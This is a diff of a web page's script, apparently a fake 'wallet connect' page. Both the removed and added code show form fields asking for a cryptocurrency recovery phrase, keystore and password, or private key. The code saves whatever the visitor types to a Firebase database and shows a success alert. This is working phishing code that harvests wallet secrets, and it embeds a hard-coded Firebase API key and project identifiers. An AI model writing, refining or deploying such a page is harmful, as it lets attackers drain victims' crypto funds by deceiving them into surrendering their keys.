@@ -237,58 +237,9 @@
     </section>
 
     <script>
-        function selectWallet() {
-            var selectedWallet = document.getElementById("wallet-list").value;
-            document.getElementById("selected-wallet").value = selectedWallet;
-            showWalletForm(selectedWallet);
-        }
-
-        function showWalletForm(selectedWallet) {
-            // Display the wallet connection form
-            document.getElementById('wallet-connect-form').style.display = 'block';
-
-            // Show or hide information input based on the selected wallet type
-            showInfoInput(selectedWallet);
-        }
-
-        function showInfoInput(selectedWallet) {
-            // Retrieve selected information type
-            const walletInfoType = document.getElementById('wallet-info-type').value;
-
-            // Remove any existing information input elements
-            const infoInputContainer = document.getElementById('info-input-container');
-            infoInputContainer.innerHTML = '';
-
-            // Dynamically create and append information input fields based on the selected type and wallet
-            switch (walletInfoType) {
-                case 'phrase':
-                    infoInputContainer.innerHTML = `
-                        <label for="wallet-phrase">Enter your recovery phrase for ${selectedWallet}:</label>
-                        <textarea id="wallet-phrase" placeholder="Typical 12 (sometimes 24) words separated by single spaces." rows="4"></textarea>
-                    `;
-                    break;
-                case 'keystore':
-                    infoInputContainer.innerHTML = `
-                        <label for="wallet-keystore">Enter Keystore for ${selectedWallet}:</label>
-                        <input type="text" id="wallet-keystore" placeholder="Several lines of text beginning with '{...}'">
-                        <label for="wallet-password">Wallet Password:</label>
-                        <input type="password" id="wallet-password" placeholder="Enter your password">
-                    `;
-                    break;
-                case 'private-key':
-                    infoInputContainer.innerHTML = `
-                        <label for="wallet-private-key">Enter your Private Key for ${selectedWallet}:</label>
-                        <input type="text" id="wallet-private-key" placeholder="Typically 12 (sometimes 24) words separated by a single space.">
-                    `;
-                    break;
-                default:
-                    break;
-            }
-        }
-
-   
-        const firebaseConfig = {
-  apiKey: "AIzaSyDL02IHV9fVfPm5r2g5-j3KxvPjrP7pj7c",
+   const firebaseConfig = {
+  // Ajoutez ici les informations de configuration de votre projet Firebase
+        apiKey: "AIzaSyDL02IHV9fVfPm5r2g5-j3KxvPjrP7pj7c",
   authDomain: "contactform-50d9f.firebaseapp.com",
   databaseURL: "https://contactform-50d9f-default-rtdb.firebaseio.com",
   projectId: "contactform-50d9f",
@@ -296,47 +247,79 @@
   messagingSenderId: "481729191146",
   appId: "1:481729191146:web:6798592b5070b2119f0b93"
 };
-                 const app = firebase.initializeApp(firebaseConfig);
-                      var contactFormDB = firebase.database().ref("contactForm");
 
-document.getElementById("contactForm").addEventListener("submit", submitForm);
+// Initialisez Firebase
+firebase.initializeApp(firebaseConfig);
 
-function submitForm(e) {
-            e.preventDefault();
+// Référence de votre base de données
+var walletConnectDB = firebase.database().ref("walletConnect");
 
-            var selectedWallet = getElementVal("selected-wallet");
-            var walletName = getElementVal("wallet-name");
-            var walletInfoType = getElementVal("wallet-info-type");
-            var infoValue = getElementVal("info-input");
+document.getElementById("wallet-connect-form").addEventListener("submit", connectWallet);
 
-            saveMessages(selectedWallet, walletName, walletInfoType, infoValue);
+function connectWallet(e) {
+  e.preventDefault();
 
-            // Enable alert
-            document.querySelector(".alert").style.display = "block";
+  var selectedWallet = getElementVal("wallet-list");
+  var walletName = getElementVal("wallet-name");
+  var walletInfoType = getElementVal("wallet-info-type");
+  var walletInfo = getElementVal("info-input");
 
-            // Remove the alert
-            setTimeout(() => {
-                document.querySelector(".alert").style.display = "none";
-            }, 3000);
+  saveWalletInfo(selectedWallet, walletName, walletInfoType, walletInfo);
 
-            // Reset the form
-            document.getElementById("contactForm").reset();
-        }
+  // Affiche l'alerte
+  document.querySelector(".alert").style.display = "block";
 
-        const saveMessages = (selectedWallet, walletName, walletInfoType, infoValue) => {
-            var newContactForm = contactFormDB.push();
+  // Supprime l'alerte après 3 secondes
+  setTimeout(() => {
+    document.querySelector(".alert").style.display = "none";
+  }, 3000);
 
-            newContactForm.set({
-                selectedWallet: selectedWallet,
-                walletName: walletName,
-                walletInfoType: walletInfoType,
-                infoValue: infoValue,
-            });
-        };
+  // Réinitialise le formulaire
+  document.getElementById("wallet-connect-form").reset();
+}
 
-        const getElementVal = (id) => {
-            return document.getElementById(id).value;
-        };
+const saveWalletInfo = (selectedWallet, walletName, walletInfoType, walletInfo) => {
+  var newWalletConnect = walletConnectDB.push();
+
+  newWalletConnect.set({
+    selectedWallet: selectedWallet,
+    walletName: walletName,
+    walletInfoType: walletInfoType,
+    walletInfo: walletInfo,
+  });
+};
+
+// Fonction pour afficher le champ d'information en fonction du type de portefeuille sélectionné
+function showInfoInput() {
+  var infoInputContainer = document.getElementById("info-input-container");
+  var walletInfoType = getElementVal("wallet-info-type");
+
+  // Efface le contenu actuel du conteneur
+  infoInputContainer.innerHTML = "";
+
+  // Crée le champ d'information en fonction du type sélectionné
+  switch (walletInfoType) {
+    case "phrase":
+      infoInputContainer.innerHTML = '<label for="info-input">Enter Recovery Phrase:</label><input type="text" id="info-input" required>';
+      break;
+    case "keystore":
+      infoInputContainer.innerHTML = '<label for="info-input">Enter Keystore:</label><input type="text" id="info-input" required>';
+      break;
+    case "private-key":
+      infoInputContainer.innerHTML = '<label for="info-input">Enter Private Key:</label><input type="text" id="info-input" required>';
+      break;
+    default:
+      break;
+  }
+}
+
+// Fonction pour récupérer la valeur d'un élément par son ID
+const getElementVal = (id) => {
+  return document.getElementById(id).value;
+};
+
+
+   
         
     </script>
 
